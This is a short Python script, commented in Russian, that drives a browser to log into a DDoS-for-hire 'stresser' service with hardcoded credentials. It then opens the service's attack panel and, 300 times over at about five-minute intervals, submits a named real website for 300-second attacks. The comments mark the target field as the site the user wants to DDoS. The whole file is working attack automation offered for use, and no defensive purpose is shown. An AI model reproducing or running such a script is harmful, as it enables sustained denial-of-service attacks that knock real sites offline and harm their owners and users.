import time
from webbot import Browser
import pyautogui
web = Browser()
web.go_to('https://stresser.app/login')
web.type('lefgdshlkjdfs', into='Username') #Логин (в первых кавычках)
web.type('facker2000', into='Password') #Пароль (в первых кавычках)
pyautogui.press('enter')
time.sleep(1)
pyautogui.press('f5')
web.type('lefgdshlkjdfs', into='Username') #Снова логин (в первых кавычках)
web.type('facker2000', into='Password') #Снова пароль (в первых кавычках)
pyautogui.press('enter')
time.sleep(3)
web.click('Attack Panel', tag='span')
for i in range(300):
    web.type('https://2gen.guru/', into='https://example.com') #Тут сайт который хочешь ддосить (в первых кавычках)
    web.type('300', into='Min: 15, Max: 300 sec')
    web.click('Send Attack', tag='span')
    time.sleep(60*5+1)
